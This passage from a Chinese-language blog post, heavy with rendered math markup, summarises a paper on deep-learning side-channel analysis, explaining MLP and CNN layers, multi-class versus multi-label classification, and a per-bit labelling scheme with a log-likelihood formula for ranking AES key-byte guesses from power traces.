</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>单层的MLP模型不能用来解决异或问题,之后研究者通过增加模型的层数,更换激活函数来弥补这方面的不足,例如现在用的比较多的sigmoid,每一层的输出都对应下一层的输入,每个神经元都与最后一层的所有神经元有关,模型经典架构如图1所示,但往往层数的增多会导致计算复杂度越来越高.</p>
<img src="../img/image-20230531113044022.png" alt="图1	经典多层感知机模型" style="zoom:50%;" />
<blockquote>
<p>CNN</p>
</blockquote>
<p>CNN引入卷积池化层来解决计算复杂度过高等问题,详细架构以及具体实现在<a href="https://i4mhmh.cn/archives/c9b25c16.html">卷积神经网络(CNN)</a>中, 这里CNN在处理一维数据时公式如下.</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>z</mi><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">]</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>w</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>⋅</mo><mi>x</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mi>k</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">z[I] = \sum\limits_{k=1}^{m}w[k]\cdot x[i-k+1]
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9535em;vertical-align:-1.3021em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3021em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span></p>
<h3 id="多分类与多标签分类">多分类与多标签分类</h3>
<p>在看这篇文章的关键技术前,需要搞懂什么叫多分类与多标签分类.举一个例子</p>
<table>
<thead>
<tr>
<th>instance</th>
<th>a</th>
<th>b</th>
<th>c</th>
<th>d</th>
<th>e</th>
</tr>
</thead>
<tbody>
<tr>
<td>x1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>x2</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>x3</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>x4</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>x5</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
</tbody>
</table>
<p>A,b,c,d,e这属于一个互斥的类,即有a不能有b,换言之五首歌曲,abcde就是歌曲的名称,这就叫做多分类,而对于多标签,就上边的歌曲而言,每首歌都对应一个或多个标签,所有的标签并不全都互斥,这样的分类即为多标签分类,采用深度学习的方法,训练时最后FN设置4个输出节点,激活函数用sigmoid作二分类,判断是否属于该标签.</p>
<table>
<thead>
<tr>
<th>instance</th>
<th>华语</th>
<th>情歌</th>
<th>古典</th>
<th>摇滚</th>
<th>民谣</th>
</tr>
</thead>
<tbody>
<tr>
<td>x1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>x2</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>x3</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>x4</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>x5</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
</tbody>
</table>
<p>作者给出多标签分类的具体细节,初始时给每条能量迹打上八个标签,每一个标签都做二分类,0或1来表示特定的bit位,8个标签组成1byte密钥数据,这样FN层就仅需要8个神经元,大大减少了最后的分类复杂度,在单比特分类任务中,由于AES的S盒为8bit,即共有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">2^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span>种可能,最后密钥每一个比特都对应256种可能,二者网络结构对比如图2所示.</p>
<img src="../img/image-20230601095044645.png" alt="图2 左侧为单比特模型输出层,右侧为多标签分类模型的输出层" style="zoom:80%;" />
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mover accent="true"><mi>k</mi><mo>~</mo></mover></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>max</mi><mo>⁡</mo></mo><mi>k</mi></munder><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>a</mi></msub></munderover><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mi mathvariant="normal">∣</mi><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>max</mi><mo>⁡</mo></mo><mi>k</mi></munder><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>a</mi></msub></munderover><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mi mathvariant="normal">∣</mi><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>max</mi><mo>⁡</mo></mo><mi>k</mi></munder><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>a</mi></msub></munderover><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>V</mi><mi>i</mi></msub><mo>=</mo><msub><mi>v</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mn mathvariant="italic">1</mn><mo separator="true">,</mo><mn mathvariant="italic">2</mn><mo separator="true">,</mo><mi>.</mi><mi>.</mi><mi>.</mi><mo separator="true">,</mo><msub><mi>N</mi><mi>a</mi></msub></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>max</mi><mo>⁡</mo></mo><mi>k</mi></munder><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>a</mi></msub></munderover><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mn>8</mn></munderover><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>i</mi></msub><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mn mathvariant="italic">1</mn><mo separator="true">,</mo><mn mathvariant="italic">2</mn><mo separator="true">,</mo><mi>.</mi><mi>.</mi><mi>.</mi><mo separator="true">,</mo><msub><mi>N</mi><mi>a</mi></msub></mrow><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
\tilde{k}
&amp;= \mathop{\arg\max}\limits_{k}\prod\limits_{i=1}^{N_a}P(K=k|X_i) \\
&amp;= \mathop{\arg\max}\limits_{k}\sum\limits_{i=1}^{N_a}log(P(K=k|X_i))\\
&amp;= \mathop{\arg\max}\limits_k\sum\limits_{i=1}^{N_a}log(P(V_i=v_i|X_i))\\
s.t. \mathit{L(k,p_i,c_i)=v_i, i=1,2,...,N_a} \\
&amp;= \mathop{\arg\max}\limits_{k}\sum\limits_{i=1}^{N_a}\sum\limits_{j=1}^{8}log(P(Y_i[j]=y_i[j]|X_i))\\
s.t. \mathit{L(k,p_i,c_i)=y_i, i=1,2,...,N_a}.
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:16.8045em;vertical-align:-8.1523em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:8.6523em;"><span style="top:-10.6523em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9313em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span><span style="top:-3.6134em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">~</span></span></span></span></span></span></span></span></span><span style="top:-7.2352em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"></span></span><span style="top:-3.8181em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"></span></span><span style="top:-1.4004em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord"><span class="mord mathit">L</span><span class="mopen">(</span><span class="mord mathit">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathit">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathit">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:1.0991em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"></span></span><span style="top:3.6528em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord"><span class="mord mathit">L</span><span class="mopen">(</span><span class="mord mathit">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathit">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3088em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathit">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathit">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathit">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mord">.</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:8.1523em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:8.6523em;"><span style="top:-10.6523em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1535em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9465em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8394em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3111em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-7.2352em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1535em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9465em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8394em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3111em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span><span style="top:-3.8181em;"><span class="pstrut" style="height:3.8394em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1535em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9465em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8394em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3111em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span 